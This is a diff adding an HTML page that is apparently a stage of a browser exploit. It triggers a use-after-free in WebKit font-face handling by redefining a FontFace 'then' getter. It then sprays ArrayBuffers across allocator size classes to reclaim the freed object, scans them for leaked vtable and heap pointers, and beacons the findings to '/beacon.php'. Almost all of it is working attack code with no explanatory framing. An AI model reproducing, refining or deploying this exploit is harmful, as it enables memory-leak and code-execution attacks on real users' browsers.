@@ -1,0 +1,180 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1137</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1137: SOURCE VTABLE CAPTURE ===');
+log('info','CSSFontFace destructor frees CSSFontFaceSource (has vtable!)');
+log('info','Spray ALL size classes inside then-getter to reclaim source cell');
+B('P1137-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+
+// Spray containers - one array per size class
+var SIZES=[16,24,32,48,64,80,96,112,128,160,192,224,256,320,384,512];
+var SPRAY_N=80; // per size class
+var allSpray={}; // keyed by size
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:s"+r+";src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var ff=new FontFace('v'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+
+  // === SYNCHRONOUS FREE ===
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  // CSSFontFace is now freed -> CSSFontFaceSource is also freed
+  // Both cells are on bmalloc free lists RIGHT NOW
+
+  // === IMMEDIATELY SPRAY ALL SIZE CLASSES ===
+  // The freed CSSFontFaceSource has a vtable at +0
+  // We don't know its size, so spray EVERY size class
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    allSpray[sz]=[];
+    for(var k=0;k<SPRAY_N;k++){
+      allSpray[sz].push(new ArrayBuffer(sz));
+    }
+  }
+
+  try{document.fonts.check('1em s'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em v'+r+', s'+r,'AB').then(function(){},function(){});
+
+// Scan after spray
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  if(!allSpray[192]){
+    B('P1137-MISS','no_uaf');
+    log('fail','UAF did not trigger');
+    return;
+  }
+
+  var totalBufs=0;
+  var nonZeroBufs=[];
+  var cffHit=null;
+  var vtableHits=[];
+  var allNonZero=[];
+
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    var bufs=allSpray[sz];
+    if(!bufs)continue;
+
+    for(var k=0;k<bufs.length;k++){
+      totalBufs++;
+      var v=new BigUint64Array(bufs[k]);
+
+      for(var q=0;q<v.length;q++){
+        if(v[q]!==0n){
+          var val=v[q];
+          var hi=Number(val>>32n);
+          var lo=Number(val&0xFFFFFFFFn);
+          var aligned=(val&7n)===0n;
+
+          // Classify
+          var tag='UNK';
+          if(val===1n) tag='REFCNT';
+          else if(hi>=0x10&&hi<=0xFF) tag='HEAP';
+          else if(hi===0&&lo<0x10000) tag='SMALL';
+          else if(hi===0xFFFFFFFF) tag='SENT';
+          else if(hi>=0x1&&hi<=0xF) tag='LOWPTR';
+          else if(aligned&&hi>=0x100&&hi<0x10000) tag='VTABLE?';
+          else if(aligned&&hi>=0x200&&hi<=0x7FFF) tag='CODE';
+          else tag='OTHER(0x'+hi.toString(16)+')';
+
+          var entry={sz:sz,k:k,q:q,val:hex64(val),tag:tag};
+          allNonZero.push(entry);
+
+          // Check for CSSFontFace pattern
+          if(sz===192&&q===0&&val===1n){
+            // Might be CSSFontFace - check q11/q13
+            if(v.length>=14&&v[11]!==0n&&v[13]!==0n){
+              var h11=Number(v[11]>>32n);
+              if(h11>=0x10&&h11<=0xFF){
+                cffHit={k:k,q11:hex64(v[11]),q13:hex64(v[13])};
+              }
+            }
+          }
+
+          // VTABLE/CODE pointer detection
+          if(q===0&&aligned&&tag==='VTABLE?'||tag==='CODE'){
+            vtableHits.push(entry);
+            log('win','VTABLE? sz='+sz+' buf['+k+'] q0='+hex64(val)+' ('+tag+')');
+          }
+
+          // Any non-zero at q0 that's not refcount=1 and not small
+          if(q===0&&val!==1n&&hi>0){
+            log('ptr','q0 data: sz='+sz+' buf['+k+'] ='+hex64(val)+' ('+tag+')');
+          }
+
+          break; // Only report first non-zero per buffer
+        }
+      }
+    }
+  }
+
+  // Report per-size summary
+  var sizeSummary={};
+  for(var i=0;i<allNonZero.length;i++){
+    var e=allNonZero[i];
+    if(!sizeSummary[e.sz])sizeSummary[e.sz]={count:0,tags:{}};
+    sizeSummary[e.sz].count++;
+    sizeSummary[e.sz].tags[e.tag]=(sizeSummary[e.sz].tags[e.tag]||0)+1;
+  }
+
+  B('P1137-SUMMARY','total='+totalBufs+'|nonzero='+allNonZero.length+'|vtable='+vtableHits.length+'|cff='+(cffHit?'yes':'no'));
+
+  // Report size breakdown
+  var sizeReport=[];
+  for(var sz in sizeSummary){
+    var s=sizeSummary[sz];
+    var tagStr=[];
+    for(var t in s.tags)tagStr.push(t+':'+s.tags[t]);
+    sizeReport.push(sz+'='+s.count+'('+tagStr.join(',')+')');
+  }
+  B('P1137-SIZES',sizeReport.join('|'));
+  log('info','Size breakdown: '+sizeReport.join('; '));
+
+  // Dump ALL non-zero buffers (up to 20)
+  for(var i=0;i<Math.min(allNonZero.length,20);i++){
+    var e=allNonZero[i];
+    // Full dump of this buffer
+    var buf=allSpray[e.sz][e.k];
+    var v=new BigUint64Array(buf);
+    var dump=[];
+    for(var q=0;q<v.length;q++){
+      if(v[q]!==0n)dump.push('q'+q+'='+hex64(v[q]));
+    }
+    B('P1137-NZ-'+i,'sz='+e.sz+'|k='+e.k+'|'+dump.join(','));
+    if(i<5) log('info','NZ['+i+'] sz='+e.sz+': '+dump.slice(0,10).join(' '));
+  }
+
+  // Report vtable hits
+  for(var i=0;i<vtableHits.length;i++){
+    B('P1137-VT-'+i,JSON.stringify(vtableHits[i]));
+  }
+
+  // CFF reference
+  if(cffHit){
+    B('P1137-CFF',JSON.stringify(cffHit));
+    log('ok','CSSFontFace: q11='+cffHit.q11+' q13='+cffHit.q13);
+  }
+
+  B('P1137-DONE',JSON.stringify({total:totalBufs,nonzero:allNonZero.length,vtable:vtableHits.length,cff:!!cffHit}));
+  log('phase','=== DONE: '+allNonZero.length+' non-zero values, '+vtableHits.length+' vtable candidates ===');
+},12);
+</script></body></html>
